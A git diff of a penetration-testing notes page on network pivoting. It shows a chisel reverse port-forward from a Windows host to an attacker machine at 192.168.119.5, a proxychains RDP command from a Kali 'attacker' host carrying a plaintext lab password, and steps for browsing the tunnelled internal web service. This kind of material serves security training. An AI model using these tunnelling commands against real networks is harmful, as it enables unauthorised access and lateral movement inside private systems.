@@ -121,7 +121,7 @@ attacker@kali$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 
 
 
-### **Port Forwarding a Web Service.**
+### **Port Forwarding an Internal Web Service.**
 
 Sometimes we may want to port foward a direct port back to our reverse port forward. We can use the syntax: **R:localport:remotehost:remoteport.**
 
@@ -133,3 +133,9 @@ C:\Users\marcus> chisel.exe client 192.168.119.5:8080 R:80:172.16.6.241:80
 2022/10/11 07:22:46 client: Connecting to ws://192.168.119.5:8080
 2022/10/11 07:22:46 client: Connected (Latency 11.0449ms)
 ```
+
+#### We can navigate to 127.0.0.1 and see the portforwarded web service
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+We may need to upate our /etc/hosts to fit the domain name.
